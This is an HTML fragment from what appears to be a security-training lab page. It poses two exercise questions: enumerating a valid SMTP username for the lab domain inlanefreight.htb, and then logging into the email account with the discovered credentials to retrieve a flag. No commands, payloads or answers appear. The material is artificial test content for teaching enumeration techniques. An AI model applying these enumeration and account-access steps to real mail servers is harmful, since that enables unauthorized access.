<label class="module-question" for="1172"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What is the available username for the domain inlanefreight.htb in the SMTP server?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1172" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1172">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1172" id="btnAnswer1172">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="1173"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1173" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1173">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1173" id="btnAnswer1173">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
